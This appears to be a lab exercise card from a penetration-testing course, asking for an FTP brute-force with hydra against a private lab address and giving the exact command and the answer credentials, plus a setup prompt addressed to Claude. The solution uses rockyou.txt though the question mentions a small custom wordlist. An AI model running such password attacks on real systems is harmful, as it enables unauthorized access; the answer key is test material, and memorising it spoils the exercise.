# Q272 — Brute Force FTP Using Hydra

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Brute force FTP login using Hydra with a small custom wordlist. Report the valid credentials."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>
```

---

## ✅ Solution

```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.52.129 ftp -t 4
```

**Answer:** `user=msfadmin; password=msfadmin`

---

## 🤖 Claude Setup Prompt

Ensure FTP (port 21) running on target. Report back: "Lab ready for Q272"
